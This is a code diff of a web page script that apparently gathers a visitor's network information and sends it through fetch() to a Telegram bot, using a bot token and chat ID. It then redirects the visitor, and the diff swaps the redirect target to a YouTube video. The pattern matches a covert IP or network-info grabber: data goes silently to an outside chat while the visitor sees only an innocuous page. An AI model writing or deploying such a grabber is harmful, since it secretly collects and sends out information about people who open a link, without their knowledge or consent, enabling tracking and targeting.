@@ -104,7 +104,7 @@
         
         const message = formatTelegramMessage(networkInfo);
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`)
           .then(response => response.json())
           .then(data => {
             console.log('Message sent to Telegram:', data);
@@ -176,7 +176,7 @@
       }
 
       sendToTelegram(networkInfo);
-      window.location.href = "https://gamedev.dou.ua/";
+      window.location.href = "https://www.youtube.com/watch?v=LdPNa6X69-I";
     });
   </script>
 </body>
